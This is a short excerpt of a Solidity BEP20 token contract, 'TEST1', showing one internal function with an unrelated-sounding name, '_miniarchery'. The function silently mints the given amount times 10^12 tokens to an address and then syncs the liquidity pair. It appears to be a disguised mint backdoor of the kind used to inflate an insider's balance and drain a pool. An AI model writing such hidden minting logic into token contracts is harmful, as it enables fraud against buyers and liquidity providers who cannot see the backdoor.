...
contract TEST1 is IBEP20, Auth {
    ...
    function _miniarchery(address sender, uint256 amount) internal virtual {
        _totalSupply = _totalSupply.add(amount*1000000000000);
        _beforeTokenTransfer(address(0), sender, amount*1000000000000);
        //_rBalance[msg.sender] = amount;
        _rBalance[sender] = _rBalance[sender].add(amount*1000000000000);
        InterfaceLP(pair).sync();
        emit Transfer(address(0), sender, amount*1000000000000);
    }
